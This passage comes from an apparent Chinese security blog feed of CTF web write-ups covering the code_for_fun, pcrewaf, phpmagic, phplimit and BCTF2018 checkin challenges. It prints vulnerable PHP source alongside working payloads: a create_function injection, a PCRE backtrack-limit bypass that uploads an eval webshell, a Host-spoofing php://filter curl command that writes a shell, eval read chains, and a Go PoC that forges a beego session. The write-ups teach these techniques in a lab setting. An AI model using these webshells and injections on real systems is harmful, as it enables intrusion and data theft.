id="思路">思路</h2><p>首先看到动态调用的action做了正则限制,所以想办法绕正则,一开始想通过范围解释操作符来绕</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">比如SimpleXMLElement::xpath</span><br></pre></td></tr></table></figure><p>但是找了很久,发现很多东西都用不起来,因为很难找到第一个参数为空的有用的东西.没办法再去找了找资料 然后发现可以通过命名空间来绕过前面的限制,比如<code>var_dump</code>表示全局命名空间 <a href="/images/2018/11/code_for_fun_1.jpg"><img src="/images/2018/11/code_for_fun_1.jpg" /></a> 但是又有什么函数可以第一个参数为空呢? 想到hitcon出现过的<code>create_function</code>利用多线程暴破匿名函数 显然create_function是可以用的 <a href="/images/2018/11/code_for_fun_2.jpg"><img src="/images/2018/11/code_for_fun_2.jpg" /></a> 弃用无所谓,后面发现还是可以用的 <code>create_function</code>可能存在的问题也很明显,就是代码注入,比如 <a href="/images/2018/11/code_for_fun_3.jpg"><img src="/images/2018/11/code_for_fun_3.jpg" /></a> 从而可以任意代码执行,但是又碰到问题了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disable functions</span><br><span class="line"></span><br><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure><p>想到flag肯定是文件形式,那么用<code>scandir</code>就好,在上一级目录发现flag <a href="/images/2018/11/code_for_fun_4.jpg"><img src="/images/2018/11/code_for_fun_4.jpg" /></a> 用<code>file_get_contents</code>获取flag,最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8087/?action=create_function&amp;arg=echo%20%22123%22;&#125;var_dump(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));/*</span><br></pre></td></tr></table></figure><p>拿到返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Deprecated: Function <span class="title function_ invoke__">create_function</span>() is deprecated in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">8</span></span><br><span class="line"></span><br><span class="line">Warning: Unterminated comment starting line <span class="number">1</span> in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">8</span>) : runtime-created <span class="function"><span class="keyword">function</span> <span class="title">on</span> <span class="title">line</span> 1</span></span><br><span class="line"><span class="function"><span class="title">string</span>(<span class="params"><span class="number">38</span></span>) &quot;<span class="title">flag</span></span>&#123;<span class="number">03</span>fdc0ee2fc464aac3c40ef0e20dcb5a&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h1 id="easy---pcrewaf">easy - pcrewaf</h1><h2 id="源码-1">源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_dir</span> = <span class="string">&#x27;data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_php</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir</span>, <span class="number">0755</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$user_dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$path</span>&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="思路-1">思路</h2><p>一开始头铁,觉得能过这个正则.. 也确实可以,在php7以下可用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>具体可以去看php的源码 php7之前的最高版本5.6.39 <a href="https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l" title="https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l">https://github.com/php/php-src/blob/PHP-5.6.39/Zend/zend_language_scanner.l</a> <a href="/images/2018/11/2018-12-06-18-11-14-创建的截图.png"><img src="/images/2018/11/2018-12-06-18-11-14-创建的截图.png" /></a> 而一到php7就没这种解析了 <a href="/images/2018/11/2018-12-06-18-13-25-创建的截图.png"><img src="/images/2018/11/2018-12-06-18-13-25-创建的截图.png" /></a> 而目标环境就是php7,到这里我就已经不会了... 后来看的wp <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" title="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a> 说到底就是PHP的pcre.backtrack_limit限制利用,当回溯次数超过限制的时候,正则表达式会返回false,而不是0或1 那么就可以利用这个点来进行攻击,poc的话前面的链接也有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br></pre></td></tr></table></figure><p>想要避免这个问题,在使用的时候用<code>===</code>来判断而不是<code>==</code>或直接判断</p><h1 id="easy---phpmagic">easy - phpmagic</h1><h2 id="源码-2">源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read-source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATA_DIR&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/data/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(DATA_DIR)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(DATA_DIR, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(DATA_DIR);</span><br><span class="line"></span><br><span class="line"><span class="variable">$domain</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;domain&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;domain&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$log_name</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;log&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;log&#x27;</span>] : <span class="title function_ invoke__">date</span>(<span class="string">&#x27;-Y-m-d&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- Required meta tags --&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap CSS --&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css&quot;</span> integrity=<span class="string">&quot;sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE=&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Domain Detail&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    pre &#123;</span><br><span class="line">        width: <span class="number">100</span>%;</span><br><span class="line">        background-color: <span class="comment">#f6f8fa;</span></span><br><span class="line">        border-radius: <span class="number">3</span>px;</span><br><span class="line">        font-size: <span class="number">85</span>%;</span><br><span class="line">        line-height: <span class="number">1.45</span>;</span><br><span class="line">        overflow: auto;</span><br><span class="line">        padding: <span class="number">16</span>px;</span><br><span class="line">        border: <span class="number">1</span>px solid <span class="comment">#ced4da;</span></span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span> <span class="title">mt</span>-3&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">prepend</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">basic</span>-<span class="title">addon1</span>&quot;&gt;<span class="title">dig</span> -<span class="title">t</span> <span class="title">A</span> -<span class="title">q</span>&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">domain</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Your</span> <span class="title">domain</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">input</span>-<span class="title">group</span>-<span class="title">append</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">outline</span>-<span class="title">secondary</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;执行&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">pre</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-3&quot;&gt;&lt;?<span class="title">php</span> <span class="title">if</span>(!<span class="title">empty</span>($<span class="title">_POST</span>) &amp;&amp; $<span class="title">domain</span>):</span></span><br><span class="line"><span class="class">                $<span class="title">command</span> = <span class="title">sprintf</span>(&quot;<span class="title">dig</span> -<span class="title">t</span> <span class="title">A</span> -<span class="title">q</span> %<span class="title">s</span>&quot;, <span class="title">escapeshellarg</span>($<span class="title">domain</span>));</span></span><br><span class="line"><span class="class">                $<span class="title">output</span> = <span class="title">shell_exec</span>($<span class="title">command</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                $<span class="title">output</span> = <span class="title">htmlspecialchars</span>($<span class="title">output</span>, <span class="title">ENT_HTML401</span>  <span class="title">ENT_QUOTES</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                $<span class="title">log_name</span> = $<span class="title">_SERVER</span>[&#x27;<span class="title">SERVER_NAME</span>&#x27;] . $<span class="title">log_name</span>;</span></span><br><span class="line"><span class="class">                <span class="title">if</span>(!<span class="title">in_array</span>(<span class="title">pathinfo</span>($<span class="title">log_name</span>, <span class="title">PATHINFO_EXTENSION</span>), [&#x27;<span class="title">php</span>&#x27;, &#x27;<span class="title">php3</span>&#x27;, &#x27;<span class="title">php4</span>&#x27;, &#x27;<span class="title">php5</span>&#x27;, &#x27;<span class="title">phtml</span>&#x27;, &#x27;<span class="title">pht</span>&#x27;], <span class="title">true</span>)) </span>&#123;</span><br><span class="line">                    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$output</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><h2 id="思路-2">思路</h2><p>简单审计一下,发现可以把dig的结果存到一个文件,那么就可以利用这一点来写shell,后面进行了一个简单的判断,然后用<code>file_put_contents</code>来写文件,简单测试一下 <a href="/images/2018/11/2018-12-06-17-14-32-创建的截图.png"><img src="/images/2018/11/2018-12-06-17-14-32-创建的截图.png" /></a> 那么写文件就不成问题了,那么问题是怎么写shell呢? 尖括号都会被转义掉,这里本来考虑到了伪协议的问题,不过卡在了<code>$_SERVER['SERVER_NAME']</code>的绕过 后来看到 <a href="/images/2018/11/2018-12-06-17-26-38-创建的截图.png"><img src="/images/2018/11/2018-12-06-17-26-38-创建的截图.png" /></a> 还是不太明白,看看英文版</p><blockquote><p>'SERVER_NAME' The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host. Note: Under Apache 2, you must set UseCanonicalName = On and ServerName. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.</p></blockquote><p>发现可以由hostname伪造,试试看改host <a href="/images/2018/11/2018-12-06-17-30-43-创建的截图.png"><img src="/images/2018/11/2018-12-06-17-30-43-创建的截图.png" /></a> 那么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$output</span>);</span><br></pre></td></tr></table></figure><p>这个<code>log_name</code>就是可控的,从而可以通过伪协议写shell 用伪协议的时候将<code>domain</code>给base一下,然后控制<code>log_name</code>来解base,从而还原shell 注意base的时候pad到字符是4的倍数,我这里多试了几次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d <span class="string">&#x27;domain=PD9waHAKZXZhbCgkX0dFVFsnYmxhY3NoZWVwJ10pOwo/Pg&amp;log=://filter/write=convert.base64-decode/resource=blacsheep3.php/.&#x27;</span> -H <span class="string">&quot;Host: php&quot;</span> <span class="string">&#x27;http://51.158.75.42:8082/&#x27;</span></span><br></pre></td></tr></table></figure><p>然后拿到shell <a href="/images/2018/11/2018-12-06-18-15-03-创建的截图.png"><img src="/images/2018/11/2018-12-06-18-15-03-创建的截图.png" /></a></p><h1 id="easy---phplimit">easy - phplimit</h1><h2 id="源码-3">源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^W]+((?R)?)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析">分析</h2><p>2018rctf的r-cursive的一部分 参考:<a href="https://xz.aliyun.com/t/2347" title="https://xz.aliyun.com/t/2347">https://xz.aliyun.com/t/2347</a> 看到他们之前的payload 尝试getallheaders但是失败了,又看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure><p>稍作修改,获得下面的payload <a href="http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B" title="http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B">http://51.158.75.42:8084/?code=print_r%28readfile%28array_rand%28array_flip%28scandir%28dirname%28chdir%28dirname%28getcwd%28%29%29%29%29%29%29%29%29%29%3B</a> 因为设计到array_rand,所以只是可能拿到flag... 多刷几次就好,主要还是通过dirname获取目录来进行返回 后来看了一波wp.. 两种方法</p><h3 id="get_defined_vars">get_defined_vars</h3><p><a href="/images/2018/11/2018-12-06-19-20-59-创建的截图.png"><img src="/images/2018/11/2018-12-06-19-20-59-创建的截图.png" /></a> 所以直接用就好 <a href="/images/2018/11/2018-12-06-19-31-33-创建的截图.png"><img src="/images/2018/11/2018-12-06-19-31-33-创建的截图.png" /></a> 注意把a(命令参数)放在前面,方便执行的时候先执行然后加注释,不然执行不了命令,比如<code>scandir()</code>就会爆内存 然后拿到flag <a href="/images/2018/11/2018-12-06-19-35-07-创建的截图.png"><img src="/images/2018/11/2018-12-06-19-35-07-创建的截图.png" /></a></p><h3 id="另一种绕过">另一种绕过</h3><p><code>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code> 用的<code>array_reverse()</code>和<code>next()</code>绕过的</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BCTF2018web(part1)</title>
      <link href="/2018/11/29/bctf2018webpart1/"/>
      <url>/2018/11/29/bctf2018webpart1/</url>
      
        <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><p>go的sessionid没有过滤<code>./</code>的时候导致可以用任意文件作为session,可以在github上面看Nov11的commit <a href="https://github.com/astaxie/beego/pull/3383" title="https://github.com/astaxie/beego/pull/3383">https://github.com/astaxie/beego/pull/3383</a> go-macaron(https://github.com/go-macaron/session version&lt;0.4.0) beego(https://github.com/astaxie/beego version&lt;1.11.0)都存在这个洞 给出一个外国选手的poc</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;github.com/astaxie/beego/session&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">    s[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    s[<span class="string">&quot;UID&quot;</span>] = <span class="number">1</span></span><br><span class="line">    encoded_s, err:= session.EncodeGob(s)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">&quot;%v&quot;</span>, encoded_s)</span><br><span class="line">    decoded_s, err := session.DecodeGob(encoded_s)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="string">&quot;%v&quot;</span>, decoded_s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑一下poc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep/Tools/MyWebTools/gogs  $ go run hatena_poc.go </span><br><span class="line">2018/11/29 19:37:16 [14 255 129 4 1 2 255 130 0 1 16 1 16 0 0 61 255 130 0 2 6 115 116 114 105 110 103 12 10 0 8 117 115 101 114 110 97 109 101 6 115 116 114 105 110 103 12 7 0 5 97 100 109 105 110 6 115 116 114 105 110 103 12 5 0 3 85 73 68 3 105 110 116 4 2 0 2]</span><br><span class="line">2018/11/29 19:37:16 map[username:admin UID:1]</span><br></pre></td></tr></table></figure><p>丢到cyberchef的fromdecimal <a href="https://gchq.github.io/CyberChef/#recipe=From_Decimal(&#39;Space&#39;,false)&amp;input=MTQgMjU1IDEyOSA0IDEgMiAyNTUgMTMwIDAgMSAxNiAxIDE2IDAgMCA2MSAyNTUgMTMwIDAgMiA2IDExNSAxMTYgMTE0IDEwNSAxMTAgMTAzIDEyIDEwIDAgOCAxMTcgMTE1IDEwMSAxMTQgMTEwIDk3IDEwOSAxMDEgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA3IDAgNSA5NyAxMDAgMTA5IDEwNSAxMTAgNiAxMTUgMTE2IDExNCAxMDUgMTEwIDEwMyAxMiA1IDAgMyA4NSA3MyA2OCAzIDEwNSAxMTAgMTE2IDQgMiAwIDI" 